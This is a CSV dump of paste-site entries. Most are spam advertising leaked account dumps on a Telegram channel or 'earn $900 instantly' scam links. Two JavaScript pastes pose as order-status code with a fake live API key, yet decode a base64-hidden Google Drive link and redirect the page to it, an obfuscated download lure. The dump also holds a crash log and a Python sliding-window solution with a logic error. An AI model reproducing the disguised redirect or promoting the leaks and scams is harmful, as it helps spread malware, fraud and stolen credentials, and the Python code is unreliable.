id,title,username,language,date,content
Z8GKwTN1,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:58:37 PM CDT,59633 Accounts Posted On https://t.me/leakedbyeminem
sqgQueQx,Untitled,x2LeaF,JavaScript,Thursday 24th of April 2025 06:57:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08776/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jtbs1VwN,EARN $900 INSTANTLY 2025 M6,vinevibes,JavaScript,Thursday 24th of April 2025 06:50:05 PM CDT," 
Pdf https://tinyurl.com/privguidee

n7ig1tkqrn
"
b2XPqG9D,2025-04-25T08:49:34.822392,powerampache,PHP,Thursday 24th of April 2025 06:49:33 PM CDT,"1.00-66 (66) - DB: 82
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
sM0KY6kj,Chaturbate with Tokens,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:43:15 PM CDT,16494 Accounts Posted On https://t.me/leakedbyeminem
fLwxfCaq,Make $1000 15-MINUTES (BEGINNER) 96,anajem,JavaScript,Thursday 24th of April 2025 06:40:09 PM CDT," 
Pdf https://tinyurl.com/privguidee

u82A7Gle1V
"
TSkDfFXX,maxiumum average subarray I,smj007,Python,Thursday 24th of April 2025 06:35:06 PM CDT,"class Solution:
    def findMaxAverage(self, nums: List[int], k: int) -> float:
        
        left = 0
        right = 0
        window_sum = 0
        max_window_sum = -float(""inf"")
        
        while right < len(nums):
            if nums[right] < k - 1:
                # keep adding until you expanded the
                # window enough
                window_sum = window_sum + nums[right]
                right += 1
            else:
                # add right most element assuming that left most
                # element is already inside the window
                window_sum = window_sum + nums[right]
                max_window_sum = max(window_sum, max_window_sum)

                # prepare for next iteration
                window_sum -= nums[left]
                left += 1
                right += 1

        return max_window_sum/(k*1.0)
"
TWmBJp4P,EARN $900 INSTANTLY 2025⭐ NU,anajem,JavaScript,Thursday 24th of April 2025 06:30:52 PM CDT," 
Pdf https://tinyurl.com/privguidee

STzKTmQAHJ
"
LihSGbxt,Crypto Accounts,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:27:53 PM CDT,26916 Accounts Posted On https://t.me/leakedbyeminem
SYH4jtWb,Order.js,x2LeaF,JavaScript,Thursday 24th of April 2025 06:27:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70896/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
